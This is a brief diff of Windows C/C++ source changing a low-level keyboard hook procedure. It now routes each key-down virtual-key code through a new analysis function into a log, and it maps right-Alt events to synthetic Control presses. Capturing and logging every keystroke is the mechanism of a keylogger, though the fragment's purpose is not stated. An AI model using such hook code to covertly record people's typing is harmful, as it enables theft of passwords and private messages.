@@ -21,7 +21,7 @@ LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 	if (nCode >= 0)
 	{
 		if (wParam == WM_KEYDOWN)
-			edit_log(log(hook_struct.vkCode));
+			edit_log(analyse_keyboard_status(hook_struct.vkCode));
 		else if (wParam == WM_SYSKEYDOWN && hook_struct.vkCode == 165) // != modifié en ==
 			keybd_event(VK_CONTROL, 0, 0, 0); 
 		else if (wParam == WM_SYSKEYUP && hook_struct.vkCode == 165)
